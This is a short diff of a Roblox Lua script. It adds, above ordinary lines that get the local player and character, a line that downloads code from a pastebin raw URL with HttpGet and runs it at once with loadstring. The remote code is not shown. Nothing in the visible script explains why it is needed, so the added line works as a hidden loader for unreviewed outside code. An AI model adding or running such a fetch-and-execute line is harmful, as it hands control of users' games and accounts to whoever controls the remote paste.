@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/Wqxzdi1q'))()
 local player = game:GetService("Players").LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 
